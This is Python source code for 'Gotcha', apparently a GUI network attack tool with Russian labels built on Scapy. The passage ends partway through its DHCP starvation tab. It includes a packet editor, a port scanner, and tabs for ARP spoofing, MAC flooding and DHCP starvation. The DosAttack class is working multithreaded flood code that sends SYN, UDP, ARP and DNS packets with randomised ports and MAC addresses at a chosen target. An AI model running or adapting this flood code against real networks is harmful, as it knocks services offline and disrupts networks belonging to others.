import tkinter as tk
from tkinter import *
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import subprocess
import socket
import random
import os
import psutil
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.l2 import ARP, Ether, STP
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.dns import DNS, DNSQR

class Theme:
    def __init__(self, root):
        self.root = root
        self.current_theme = "dark"
        self.setup_themes()
        
    def setup_themes(self):
        self.themes = {
            "light": {
                "primary_bg": "#ffffff",
                "secondary_bg": "#f8f9fa", 
                "primary_fg": "#212529",
                "secondary_fg": "#6c757d",
                "accent": "#007bff",
                "success": "#28a745",
                "warning": "#ffc107",
                "danger": "#dc3545",
                "border": "#dee2e6",
                "input_bg": "#ffffff",
                "input_fg": "#212529",
                "button_bg": "#4D4D4D",
                "button_fg": "#ffffff",
                "tree_bg": "#ffffff",
                "tree_fg": "#212529",
                "tree_selected": "#4D4D4D",
                "text_bg": "#ffffff",
                "text_fg": "#212529",
                "window_bg": "#ffffff"
            },
            "dark": {
                "primary_bg": "#1a1a1a",
                "secondary_bg": "#2d2d2d",
                "primary_fg": "#e9ecef", 
                "secondary_fg": "#adb5bd",
                "accent": "#0d6efd",
                "success": "#198754",
                "warning": "#ffca2c",
                "danger": "#dc3545",
                "border": "#495057",
                "input_bg": "#2d2d2d",
                "input_fg": "#e9ecef",
                "button_bg": "#4D4D4D",
                "button_fg": "#ffffff",
                "tree_bg": "#2d2d2d",
                "tree_fg": "#e9ecef",
                "tree_selected": "#4D4D4D",
                "text_bg": "#2d2d2d",
                "text_fg": "#e9ecef",
                "window_bg": "#1a1a1a"
            }
        }
    
    def apply_theme(self, theme_name):
        if theme_name not in self.themes:
            return
        
        self.current_theme = theme_name
        theme = self.themes[theme_name]
        
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure(".", 
                       background=theme["primary_bg"],
                       foreground=theme["primary_fg"],
                       fieldbackground=theme["input_bg"],
                       selectbackground=theme["accent"],
                       font=('Arial', 9))
        
        self.root.configure(bg=theme["window_bg"])
        self.root.tk_setPalette(
            background=theme["window_bg"],
            foreground=theme["primary_fg"],
            activeBackground=theme["accent"],
            activeForeground=theme["button_fg"]
        )
        
        style.configure("TFrame", background=theme["primary_bg"])
        style.configure("TLabel", background=theme["primary_bg"], foreground=theme["primary_fg"], font=('Arial', 9))
        style.configure("TLabelframe", background=theme["secondary_bg"], foreground=theme["primary_fg"])
        style.configure("TLabelframe.Label", background=theme["secondary_bg"], foreground=theme["primary_fg"], font=('Arial', 9))
        
        style.configure("TButton", 
                       background=theme["button_bg"],
                       foreground=theme["button_fg"],
                       focuscolor=theme["accent"],
                       padding=(6, 3), 
                       font=('Arial', 9),
                       wraplength=150)
        style.map("TButton",
                 background=[('active', theme["accent"]),
                           ('pressed', theme["accent"])])
        
        style.configure("TEntry",
                       fieldbackground=theme["input_bg"],
                       foreground=theme["input_fg"],
                       insertcolor=theme["input_fg"],
                       font=('Arial', 9))
        
        style.configure("TCombobox",
                       fieldbackground=theme["input_bg"],
                       foreground=theme["input_fg"],
                       background=theme["button_bg"],
                       font=('Arial', 9))
        
        style.configure("TCheckbutton",
                       background=theme["primary_bg"],
                       foreground=theme["primary_fg"])
        
        style.configure("TNotebook", background=theme["secondary_bg"])
        style.configure("TNotebook.Tab",
                       background=theme["secondary_bg"],
                       foreground=theme["secondary_fg"])
        style.map("TNotebook.Tab",
                 background=[('selected', theme["primary_bg"])],
                 foreground=[('selected', theme["primary_fg"])])
        
        style.configure("Treeview",
                       background=theme["tree_bg"],
                       foreground=theme["tree_fg"],
                       fieldbackground=theme["tree_bg"])
        style.map("Treeview", background=[('selected', theme["tree_selected"])])
        
        style.configure("TScrollbar",
                       background=theme["secondary_bg"],
                       troughcolor=theme["primary_bg"],
                       arrowcolor=theme["primary_fg"])
        
        self.apply_to_widgets(self.root, theme)
        
    def apply_to_widgets(self, widget, theme):
        try:
            widget_type = widget.winfo_class()
            
            if widget_type in ("Frame", "Labelframe", "LabelFrame"):
                widget.config(bg=theme["primary_bg"])
            elif widget_type == "Label":
                widget.config(bg=theme["primary_bg"], fg=theme["primary_fg"], font=('Arial', 9))
            elif widget_type == "Button":
                widget.config(bg=theme["button_bg"], fg=theme["button_fg"],
                            activebackground=theme["accent"], font=('Arial', 9),
                            padx=8, pady=3, wraplength=150)
            elif widget_type == "Entry":
                widget.config(bg=theme["input_bg"], fg=theme["input_fg"],
                            insertbackground=theme["input_fg"], font=('Arial', 9))
            elif widget_type == "Text":
                widget.config(bg=theme["text_bg"], fg=theme["text_fg"],
                            insertbackground=theme["text_fg"], font=('Arial', 9))
            elif widget_type == "Scrollbar":
                widget.config(bg=theme["secondary_bg"], troughcolor=theme["primary_bg"])
            elif widget_type == "Listbox":
                widget.config(bg=theme["input_bg"], fg=theme["input_fg"], font=('Arial', 9))
            elif widget_type == "Canvas":
                widget.config(bg=theme["primary_bg"])
                
        except Exception:
            pass
        
        for child in widget.winfo_children():
            self.apply_to_widgets(child, theme)

class Editor:
    def __init__(self, parent, packet, callback):
        self.parent = parent
        self.packet = packet
        self.callback = callback
        self.edited_packet = None
        
        self.editor_window = tk.Toplevel(parent)
        self.editor_window.title("Редактор пакета")
        self.editor_window.geometry("900x700")
        self.editor_window.transient(parent)
        self.editor_window.grab_set()
        
        self.create_widgets()
        self.parse_packet()
        
    def create_widgets(self):
        main_frame = ttk.Frame(self.editor_window)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)

        info_frame = ttk.LabelFrame(main_frame, text="Информация о пакете")
        info_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(info_frame, text="Исходный пакет:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.original_info = ttk.Label(info_frame, text=self.packet.summary())
        self.original_info.grid(row=0, column=1, padx=5, pady=2, sticky='w')

        details_frame = ttk.LabelFrame(main_frame, text="Детали пакета")
        details_frame.pack(fill='x', padx=5, pady=5)
        
        self.packet_details = scrolledtext.ScrolledText(details_frame, height=8, wrap=tk.WORD)
        self.packet_details.pack(fill='both', expand=True, padx=5, pady=5)
        self.packet_details.config(state='normal')
        
        eth_frame = ttk.LabelFrame(main_frame, text="Ethernet Layer")
        eth_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(eth_frame, text="Source MAC:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.eth_src = ttk.Entry(eth_frame, width=20)
        self.eth_src.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(eth_frame, text="Dest MAC:").grid(row=0, column=2, padx=5, pady=2, sticky='w')
        self.eth_dst = ttk.Entry(eth_frame, width=20)
        self.eth_dst.grid(row=0, column=3, padx=5, pady=2, sticky='w')

        ip_frame = ttk.LabelFrame(main_frame, text="IP Layer")
        ip_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(ip_frame, text="Source IP:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.ip_src = ttk.Entry(ip_frame, width=20)
        self.ip_src.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(ip_frame, text="Dest IP:").grid(row=0, column=2, padx=5, pady=2, sticky='w')
        self.ip_dst = ttk.Entry(ip_frame, width=20)
        self.ip_dst.grid(row=0, column=3, padx=5, pady=2, sticky='w')
        
        ttk.Label(ip_frame, text="TTL:").grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.ip_ttl = ttk.Entry(ip_frame, width=10)
        self.ip_ttl.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        transport_frame = ttk.LabelFrame(main_frame, text="Transport Layer")
        transport_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(transport_frame, text="Protocol:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.transport_proto = ttk.Combobox(transport_frame, values=["TCP", "UDP", "ICMP", "RAW"], width=10)
        self.transport_proto.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(transport_frame, text="Source Port:").grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.src_port = ttk.Entry(transport_frame, width=10)
        self.src_port.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(transport_frame, text="Dest Port:").grid(row=1, column=2, padx=5, pady=2, sticky='w')
        self.dst_port = ttk.Entry(transport_frame, width=10)
        self.dst_port.grid(row=1, column=3, padx=5, pady=2, sticky='w')

        tcp_flags_frame = ttk.Frame(transport_frame)
        tcp_flags_frame.grid(row=2, column=0, columnspan=4, pady=5)
        
        self.tcp_flags_vars = {}
        tcp_flags = ["FIN", "SYN", "RST", "PSH", "ACK", "URG", "ECE", "CWR"]
        for i, flag in enumerate(tcp_flags):
            self.tcp_flags_vars[flag] = tk.BooleanVar()
            ttk.Checkbutton(tcp_flags_frame, text=flag, variable=self.tcp_flags_vars[flag]).grid(
                row=0, column=i, padx=2, sticky='w')

        data_frame = ttk.LabelFrame(main_frame, text="Payload Data")
        data_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.payload_data = scrolledtext.ScrolledText(data_frame, height=10, wrap=tk.WORD)
        self.payload_data.pack(fill='both', expand=True, padx=5, pady=5)

        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        ttk.Button(button_frame, text="Применить изменения", 
                  command=self.apply_changes).pack(side='left', padx=5)
        ttk.Button(button_frame, text="Отмена", 
                  command=self.editor_window.destroy).pack(side='right', padx=5)
        
    def parse_packet(self):
        if self.packet.haslayer(Ether):
            self.eth_src.insert(0, self.packet[Ether].src)
            self.eth_dst.insert(0, self.packet[Ether].dst)
        
        if self.packet.haslayer(IP):
            self.ip_src.insert(0, self.packet[IP].src)
            self.ip_dst.insert(0, self.packet[IP].dst)
            self.ip_ttl.insert(0, str(self.packet[IP].ttl))
            
            if self.packet.haslayer(TCP):
                self.transport_proto.set("TCP")
                self.src_port.insert(0, str(self.packet[TCP].sport))
                self.dst_port.insert(0, str(self.packet[TCP].dport))

                flags = self.packet[TCP].flags
                self.tcp_flags_vars["FIN"].set(bool(flags & 0x01))
                self.tcp_flags_vars["SYN"].set(bool(flags & 0x02))
                self.tcp_flags_vars["RST"].set(bool(flags & 0x04))
                self.tcp_flags_vars["PSH"].set(bool(flags & 0x08))
                self.tcp_flags_vars["ACK"].set(bool(flags & 0x10))
                self.tcp_flags_vars["URG"].set(bool(flags & 0x20))
                self.tcp_flags_vars["ECE"].set(bool(flags & 0x40))
                self.tcp_flags_vars["CWR"].set(bool(flags & 0x80))
                
                if self.packet.haslayer(Raw):
                    try:
                        self.payload_data.insert('1.0', self.packet[Raw].load.hex())
                    except:
                        self.payload_data.insert('1.0', str(self.packet[Raw].load))
                    
            elif self.packet.haslayer(UDP):
                self.transport_proto.set("UDP")
                self.src_port.insert(0, str(self.packet[UDP].sport))
                self.dst_port.insert(0, str(self.packet[UDP].dport))
                
                if self.packet.haslayer(Raw):
                    try:
                        self.payload_data.insert('1.0', self.packet[Raw].load.hex())
                    except:
                        self.payload_data.insert('1.0', str(self.packet[Raw].load))
                    
            elif self.packet.haslayer(ICMP):
                self.transport_proto.set("ICMP")
            else:
                self.transport_proto.set("RAW")

        self.show_packet_details()
                
    def show_packet_details(self):
        details = "=== ДЕТАЛИ ПАКЕТА ===\n\n"
        
        if self.packet.haslayer(Ether):
            details += f"Ethernet:\n"
            details += f"  Source: {self.packet[Ether].src}\n"
            details += f"  Destination: {self.packet[Ether].dst}\n"
            details += f"  Type: {self.packet[Ether].type}\n\n"
        
        if self.packet.haslayer(IP):
            details += f"IP:\n"
            details += f"  Version: {self.packet[IP].version}\n"
            details += f"  Source: {self.packet[IP].src}\n"
            details += f"  Destination: {self.packet[IP].dst}\n"
            details += f"  TTL: {self.packet[IP].ttl}\n"
            details += f"  Protocol: {self.packet[IP].proto}\n\n"
            
        if self.packet.haslayer(TCP):
            details += f"TCP:\n"
            details += f"  Source Port: {self.packet[TCP].sport}\n"
            details += f"  Destination Port: {self.packet[TCP].dport}\n"
            details += f"  Flags: {self.packet[TCP].flags}\n"
            details += f"  Sequence: {self.packet[TCP].seq}\n"
            details += f"  Acknowledgment: {self.packet[TCP].ack}\n"
            details += f"  Window: {self.packet[TCP].window}\n\n"
            
        elif self.packet.haslayer(UDP):
            details += f"UDP:\n"
            details += f"  Source Port: {self.packet[UDP].sport}\n"
            details += f"  Destination Port: {self.packet[UDP].dport}\n"
            details += f"  Length: {self.packet[UDP].len}\n\n"
            
        elif self.packet.haslayer(ICMP):
            details += f"ICMP:\n"
            details += f"  Type: {self.packet[ICMP].type}\n"
            details += f"  Code: {self.packet[ICMP].code}\n\n"
            
        if self.packet.haslayer(Raw):
            details += f"Payload:\n"
            payload = self.packet[Raw].load
            details += f"  Length: {len(payload)} bytes\n"
            try:
                details += f"  Hex: {payload.hex()}\n"
                if len(payload) < 100:
                    try:
                        text = payload.decode('utf-8', errors='ignore')
                        if all(c.isprintable() or c in '\n\r\t' for c in text):
                            details += f"  Text: {text}\n"
                    except:
                        pass
            except:
                details += f"  Content: {str(payload)}\n"
        
        self.packet_details.insert('1.0', details)
        self.packet_details.config(state='disabled')
                
    def apply_changes(self):
        try:
            new_packet = self.create_modified_packet()
            self.edited_packet = new_packet
            self.callback(new_packet, True)
            self.editor_window.destroy()
            
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось создать пакет: {str(e)}")
    
    def create_modified_packet(self):
        new_packet = Ether()

        if self.eth_src.get():
            dst_mac = self.eth_dst.get() if self.eth_dst.get() else "ff:ff:ff:ff:ff:ff"
            new_packet = Ether(src=self.eth_src.get(), dst=dst_mac)

        if self.ip_src.get() and self.ip_dst.get():
            ip_packet = IP(src=self.ip_src.get(), dst=self.ip_dst.get())
            if self.ip_ttl.get():
                try:
                    ip_packet.ttl = int(self.ip_ttl.get())
                except:
                    pass
                    
            new_packet = new_packet / ip_packet

            proto = self.transport_proto.get()
            if proto == "TCP" and self.src_port.get() and self.dst_port.get():
                tcp_packet = TCP(sport=int(self.src_port.get()), dport=int(self.dst_port.get()))

                flags = 0
                if self.tcp_flags_vars["FIN"].get(): flags |= 0x01
                if self.tcp_flags_vars["SYN"].get(): flags |= 0x02
                if self.tcp_flags_vars["RST"].get(): flags |= 0x04
                if self.tcp_flags_vars["PSH"].get(): flags |= 0x08
                if self.tcp_flags_vars["ACK"].get(): flags |= 0x10
                if self.tcp_flags_vars["URG"].get(): flags |= 0x20
                if self.tcp_flags_vars["ECE"].get(): flags |= 0x40
                if self.tcp_flags_vars["CWR"].get(): flags |= 0x80
                
                tcp_packet.flags = flags
                new_packet = new_packet / tcp_packet
                
            elif proto == "UDP" and self.src_port.get() and self.dst_port.get():
                new_packet = new_packet / UDP(sport=int(self.src_port.get()), dport=int(self.dst_port.get()))
                
            elif proto == "ICMP":
                new_packet = new_packet / ICMP()
            
            payload_text = self.payload_data.get('1.0', 'end').strip()
            if payload_text:
                try:
                    payload_bytes = bytes.fromhex(payload_text.replace(' ', '').replace('\n', ''))
                    new_packet = new_packet / Raw(load=payload_bytes)
                except:
                    new_packet = new_packet / Raw(load=payload_text.encode())
        
        return new_packet

class DosAttack:
    def __init__(self, app):
        self.app = app
        self.running = False
        self.threads = []
        self.stats_lock = threading.Lock()
        self.stats = {
            'sent_packets': 0,
            'start_time': 0,
            'last_update': 0,
            'last_sent': 0
        }
    
    def start(self, target_ip, protocol, port, packet_size, packet_count, delay, continuous):
        self.running = True
        self.stats['start_time'] = time.time()
        self.stats['sent_packets'] = 0
        self.stats['last_update'] = time.time()
        
        num_threads = min(4, os.cpu_count() or 2)
        self.app.custom_log.insert('end', f"🧵 Запуск {num_threads} потоков для атаки\n")
        
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.attack_worker,
                args=(i+1, target_ip, protocol, port, packet_size, packet_count, delay, continuous),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
    
    def stop(self):
        self.running = False
        self.threads.clear()
    
    def attack_worker(self, thread_id, target_ip, protocol, port, packet_size, total_packet_count, delay, continuous):
        interface = self.app.custom_interface.get()
        sent = 0
        
        try:
            template = self.create_packet_template(protocol, target_ip, port, packet_size)
            batch_size = 50
            
            while self.running:
                batch_sent = 0
                
                while batch_sent < batch_size and (continuous or sent < total_packet_count):
                    try:
                        packet = self.modify_packet_template(template.copy(), protocol)
                        
                        if protocol == "ARP":
                            sendp(packet, iface=interface, verbose=0, count=1)
                        else:
                            send(packet, verbose=0, count=1)
                        
                        sent += 1
                        batch_sent += 1
                        
                        with self.stats_lock:
                            self.stats['sent_packets'] += 1
                        
                        if delay > 0:
                            time.sleep(delay)
                            
                    except Exception as e:
                        if self.running:
                            self.app.custom_log.insert('end', f"❌ Ошибка в потоке {thread_id}: {str(e)}\n")
                        break
                
                if not continuous and sent >= total_packet_count:
                    break
                
                time.sleep(0.001)
                
                if sent % 500 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    rate = sent / elapsed if elapsed > 0 else 0
                    
                    if self.app.custom_attack_running:
                        self.app.custom_log.insert('end', 
                            f"📨 Поток {thread_id}: {sent} пакетов ({int(rate)}/сек)\n")
                        self.app.custom_log.see('end')
            
            elapsed = time.time() - self.stats['start_time']
            rate = sent / elapsed if elapsed > 0 else 0
            self.app.custom_log.insert('end', f"✅ Поток {thread_id} завершен: {sent} пакетов\n")
            
        except Exception as e:
            if self.running:
                self.app.custom_log.insert('end', f"💥 Критическая ошибка в потоке {thread_id}: {str(e)}\n")
    
    def create_packet_template(self, protocol, target_ip, port, packet_size):
        if protocol == "ICMP":
            return IP(dst=target_ip)/ICMP()
        elif protocol == "TCP":
            return IP(dst=target_ip)/TCP(dport=port, sport=random.randint(1024, 65535), flags="S")
        elif protocol == "UDP":
            payload_size = max(0, packet_size - 28)
            return IP(dst=target_ip)/UDP(dport=port, sport=random.randint(1024, 65535))/Raw(load=b'U' * payload_size)
        elif protocol == "ARP":
            return Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                op=1,
                pdst=target_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                psrc="0.0.0.0",
                hwsrc=self.generate_random_mac()
            )
        elif protocol == "DNS":
            return IP(dst=target_ip)/UDP(dport=53, sport=random.randint(1024, 65535))/DNS(rd=1, qd=DNSQR(qname="example.com"))
        return None
    
    def modify_packet_template(self, packet, protocol):
        if packet.haslayer(IP):
            packet[IP].id = random.randint(1, 65535)
        if packet.haslayer(TCP):
            packet[TCP].sport = random.randint(1024, 65535)
            packet[TCP].seq = random.randint(1, 4294967295)
        elif packet.haslayer(UDP):
            packet[UDP].sport = random.randint(1024, 65535)
        elif packet.haslayer(ARP):
            packet[ARP].hwsrc = self.generate_random_mac()
        return packet
    
    def generate_random_mac(self):
        return "%02x:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
    
    def get_stats(self):
        with self.stats_lock:
            return self.stats.copy()

class Gotcha:
    def __init__(self, root):
        self.root = root
        self.root.title("Gotcha")
        self.root.geometry("1200x800")
        
        root.iconbitmap("images.ico")
        
        self.theme_manager = Theme(self.root)
        
        self.sniffing_running = False
        self.dhcp_attack_running = False
        self.mac_flood_running = False
        self.arp_spoof_running = False
        self.custom_attack_running = False
        self.packet_intercept_running = False
        self.captured_packet = None
        self.selected_packet = None
        self.intercept_packets = []
        self.edited_packet = None
        
        self.sniff_thread = None
        self.dhcp_thread = None
        self.mac_flood_thread = None
        self.arp_spoof_thread = None
        self.custom_attack_threads = []
        self.intercept_thread = None
        
        self.dos_attack = DosAttack(self)
        
        self.network_interfaces = self.get_interface_list()
        
        self.setup_gui()
        self.theme_manager.apply_theme("dark")
        
        self.setup_system_monitor()
    
    def setup_system_monitor(self):
        self.system_monitor_running = True
        self.update_system_monitor()
    
    def update_system_monitor(self):
        try:
            cpu_percent = psutil.cpu_percent(interval=None)
            memory = psutil.virtual_memory()
            ram_percent = memory.percent
            
            self.cpu_label.config(text=f"CPU: {cpu_percent:.1f}%")
            self.ram_label.config(text=f"RAM: {ram_percent:.1f}%")
        except:
            self.cpu_label.config(text="CPU: N/A")
            self.ram_label.config(text="RAM: N/A")
        
        if self.system_monitor_running:
            self.root.after(1000, self.update_system_monitor)
    
    def get_interface_list(self):
        interfaces = []
        try:
            iface_list = get_if_list()
            for iface in iface_list:
                interfaces.append(iface)
        except:
            pass
        
        if not interfaces:
            interfaces = ["Ethernet", "Wi-Fi", "eth0", "wlan0"]
        
        return interfaces
    
    def setup_gui(self):
        main_notebook = ttk.Notebook(self.root)
        main_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        
        auxiliary_frame = ttk.Frame(main_notebook)
        main_notebook.add(auxiliary_frame, text="Вспомогательное")
        
        auxiliary_notebook = ttk.Notebook(auxiliary_frame)
        auxiliary_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        
        access_frame = ttk.Frame(auxiliary_notebook)
        auxiliary_notebook.add(access_frame, text="Доступ")
        self.setup_access_tab(access_frame)
        
        settings_frame = ttk.Frame(auxiliary_notebook)
        auxiliary_notebook.add(settings_frame, text="Настройки")
        self.setup_settings_tab(settings_frame)
        
        attacks_frame = ttk.Frame(main_notebook)
        main_notebook.add(attacks_frame, text="Атаки")
        
        attacks_notebook = ttk.Notebook(attacks_frame)
        attacks_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        
        intercept_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(intercept_frame, text="Перехват пакетов")
        self.setup_intercept_tab(intercept_frame)
        
        dhcp_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(dhcp_frame, text="DHCP атака")
        self.setup_dhcp_tab(dhcp_frame)
        
        custom_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(custom_frame, text="Dos атака")
        self.setup_custom_attack_tab(custom_frame)
        
        mac_flood_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(mac_flood_frame, text="MAC Flood")
        self.setup_mac_flood_tab(mac_flood_frame)
        
        arp_spoof_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(arp_spoof_frame, text="ARP Spoofing")
        self.setup_arp_spoof_tab(arp_spoof_frame)
        
        self.status_var = tk.StringVar()
        self.status_var.set("Готов")
        
        status_bar = ttk.Frame(self.root)
        status_bar.pack(side='bottom', fill='x')
        
        ttk.Label(status_bar, textvariable=self.status_var, relief='sunken', 
                 font=('Arial', 8), width=50).pack(side='left', fill='x', expand=True)
        
        self.cpu_label = ttk.Label(status_bar, text="CPU: 0%", relief='sunken', 
                                  font=('Arial', 8), width=12)
        self.cpu_label.pack(side='right', padx=(2, 0))
        
        self.ram_label = ttk.Label(status_bar, text="RAM: 0%", relief='sunken', 
                                  font=('Arial', 8), width=12)
        self.ram_label.pack(side='right', padx=(2, 10))
    
    def get_network_adapters(self):
        try:
            interfaces = get_if_list()
            result = []
            for iface in interfaces:
                display_name = iface
                if not iface.startswith(r'\Device\NPF_'):
                    display_name = r'\Device\NPF_' + iface
                
                result.append(f"Интерфейс: {display_name}")
                
                try:
                    ip = get_if_addr(iface)
                    mac = get_if_hwaddr(iface)
                    result.append(f"  IP: {ip}, MAC: {mac}")
                except Exception as e:
                    result.append(f"  Не удалось получить информацию об интерфейсе")
                result.append("")
            
            return "\n".join(result)
        except Exception as e:
            return f"Ошибка получения информации об сетевых интерфейсах: {str(e)}"

    def get_ip_route_formatted(self):
        try:
            result = subprocess.run(['route', 'print'], capture_output=True, text=True, encoding='cp866')
            lines = result.stdout.split('\n')
            
            formatted_lines = []
            for line in lines:
                if line.strip():
                    formatted_lines.append(line)
            
            return "\n".join(formatted_lines)
        except Exception as e:
            return f"Ошибка получения таблицы маршрутизации: {str(e)}"

    def run_traceroute(self):
        def traceroute_worker():
            ip = self.access_ip.get()
            try:
                self.access_output.insert('end', f"Traceroute к {ip}...\n")
                self.access_output.see('end')
                
                if os.name == 'nt':
                    cmd = ['tracert', '-d', '-h', '30', '-w', '1000', ip]
                else:
                    cmd = ['traceroute', '-n', '-m', '30', '-w', '1', ip]
                
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='cp866' if os.name == 'nt' else 'utf-8'
                )
                
                for line in iter(process.stdout.readline, ''):
                    self.access_output.insert('end', line)
                    self.access_output.see('end')
                    self.root.update()
                
                process.stdout.close()
                process.wait()
                
                self.access_output.insert('end', f"\nTraceroute завершен.\n")
                self.access_output.see('end')
                
            except Exception as e:
                self.access_output.insert('end', f"Ошибка Traceroute: {str(e)}\n")
        
        threading.Thread(target=traceroute_worker, daemon=True).start()

    def setup_access_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        top_frame = ttk.Frame(main_frame)
        top_frame.pack(fill='x', padx=5, pady=5)
        
        input_frame = ttk.LabelFrame(top_frame, text="Базовые функции доступа")
        input_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(input_frame, text="IP адрес:").grid(row=0, column=0, padx=4, pady=3, sticky='w')
        self.access_ip = ttk.Entry(input_frame, width=18, font=('Arial', 9))
        self.access_ip.grid(row=0, column=1, padx=4, pady=3, sticky='w')
        self.access_ip.insert(0, "192.168.1.1")
        
        button_frame = ttk.Frame(input_frame)
        button_frame.grid(row=1, column=0, columnspan=4, pady=6)
        
        ttk.Button(button_frame, text="ICMP Ping", 
                  command=self.run_ping, width=12).pack(side='left', padx=3)
        ttk.Button(button_frame, text="Port Scan", 
                  command=self.run_port_scan, width=12).pack(side='left', padx=3)
        ttk.Button(button_frame, text="Traceroute", 
                  command=self.run_traceroute, width=12).pack(side='left', padx=3)
        
        network_buttons_frame = ttk.Frame(input_frame)
        network_buttons_frame.grid(row=2, column=0, columnspan=4, pady=6)
        
        ttk.Button(network_buttons_frame, text="Таблица маршрутизации", 
                  command=self.show_ip_route, width=20).pack(side='left', padx=2)
        ttk.Button(network_buttons_frame, text="Сетевые адаптеры", 
                  command=self.show_network_info, width=18).pack(side='left', padx=2)
        
        output_frame = ttk.LabelFrame(main_frame, text="Результаты")
        output_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.access_output = scrolledtext.ScrolledText(output_frame, height=18, wrap=tk.WORD, font=('Consolas', 8))
        self.access_output.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(output_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.access_output), width=14).pack(pady=4)

    def show_ip_route(self):
        def worker():
            self.access_output.insert('end', "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\n\n")
            route_info = self.get_ip_route_formatted()
            self.access_output.insert('end', route_info)
            self.access_output.insert('end', "\n" + "="*50 + "\n")
            self.access_output.see('end')
        
        threading.Thread(target=worker, daemon=True).start()

    def show_network_info(self):
        try:
            self.access_output.insert('end', "=== СЕТЕВЫЕ ИНТЕРФЕЙСЫ ===\n\n")
            interface_info = self.get_network_adapters()
            self.access_output.insert('end', interface_info)
            self.access_output.insert('end', "\n" + "="*50 + "\n")
            self.access_output.see('end')
        except Exception as e:
            self.access_output.insert('end', f"Ошибка: {str(e)}\n")

    def run_ping(self):
        def ping_worker():
            ip = self.access_ip.get()
            try:
                process = subprocess.Popen(
                    ['ping', '-n', '4', ip],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='cp866'
                )
                
                for line in iter(process.stdout.readline, ''):
                    self.access_output.insert('end', line)
                    self.access_output.see('end')
                    self.root.update()
                
                process.stdout.close()
                process.wait()
                
            except Exception as e:
                self.access_output.insert('end', f"Ошибка: {str(e)}\n")
        
        threading.Thread(target=ping_worker, daemon=True).start()

    def run_port_scan(self):
        def port_scan_worker():
            ip = self.access_ip.get()
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389] 
            
            self.access_output.insert('end', f"Сканирование портов {ip}...\n")
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        self.access_output.insert('end', f"Порт {port} открыт\n")
                    sock.close()
                except:
                    pass
                
            self.access_output.insert('end', "Сканирование завершено\n")
        
        threading.Thread(target=port_scan_worker, daemon=True).start()

    def setup_dhcp_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        params_frame = ttk.LabelFrame(main_frame, text="Параметры DHCP Starvation атаки")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row1, text="Интерфейс:", width=15, anchor='w').pack(side='left', padx=5)
        self.dhcp_interface = ttk.Combobox(row1, width=20, font=('Arial', 9), values=self.network_interfaces)
        self.dhcp_interface.pack(side='left', padx=5)
        self.dhcp_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row2, text="Размер пула IP:", width=15, anchor='w').pack(side='left', padx=5)
        self.dhcp_pool_size = ttk.Entry(row2, width=20, font=('Arial', 9))
        self.dhcp_pool_size.pack(side='left', padx=5)
        self.dhcp_pool_size.insert(0, "254")
        
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row3, text="Кол-во запросов:", width=15, anchor='w').pack(side='left', padx=5)
        self.dhcp_request_count = ttk.Entry(row3, width=20, font=('Arial', 9))
        self.dhcp_request_count.pack(side='left', padx=5)
